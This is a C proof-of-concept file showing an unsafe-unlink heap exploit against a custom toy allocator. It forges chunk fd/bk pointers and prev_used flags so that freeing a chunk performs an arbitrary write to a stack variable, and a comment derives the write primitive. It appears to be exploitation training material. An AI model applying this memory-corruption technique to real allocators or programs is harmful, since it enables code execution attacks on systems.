#include "../heap/heap.h"
#include <stddef.h>

/* adds offset to a pointer*/
#define offsetptrfd(ptr, off, T) (T*)((ulong)ptr + (ulong)off)
/* subs offset to a pointer*/
#define offsetptrbk(ptr, off, T) (T*)((ulong)ptr - (ulong)off)

#define mem2chunk(mem) (offsetptrbk(mem, sizeof(hchunk), void))
#define chunk2mem(chunk) (offsetptrfd(chunk, sizeof(hchunk), void))

int main(void)
{
    /*
        binlist_unlink(ptr) { 
            if(ptr->fd != NULL) 
            { 
                ptr->fd->bk = ptr->bk; 
            } 
            if(ptr->bk != NULL) 
            { 
                ptr->bk->fd = ptr->fd; 

            }
        }

    ptr->bk->fd = ptr->fd
    ptr->bk + offsetof(fd) = ptr->fd
    ptr->bk = ptr->fd - offsetof(hchunk, fd)

    Arbitrary write :
    dst - offsetof(hchunk, fd) : ptr->bk 
    src : ptr->fd 
}
    
    */

    ulong def = 0;

    char b1[50];
    ulong* changeme = &def;

    char b2[50];
    ulong other = 1337;

    char b3[50];

    void* ptr1 = halloc(32);
    hchunk* chunk1 = (hchunk*)mem2chunk(ptr1);

    void* ptr2 = halloc(32);
    hchunk* chunk2 = (hchunk*)mem2chunk(ptr2);

    chunk1->prev_used = 0;
    chunk1->prev_size = 0; // consolidate with itself

    ulong bkoff = (ulong)offsetof(hchunk, bk);
    ulong fdoff = (ulong)offsetof(hchunk, fd);

    printf("hchunk->fd offset : %lu\n", fdoff);
    printf("hchunk->bk offset : %lu\n", bkoff);

    chunk2->used = 0;
    /* will write chunk2->bk = &other in changeme*/
    chunk2->fd = (void*)((ulong)&changeme - bkoff);
    /* will write chunk2->fd = &changeme - bkoff in other + fdoff = other + 32*/
    chunk2->bk = (void*)&other;

    
    hfree(ptr1);
    
    printf("changeme@%p : %p *= %lx\n", &changeme, (void*)changeme, *changeme);
    printf("other@%p %p\n", &other, (void*)other);
    

    hcleanup();
}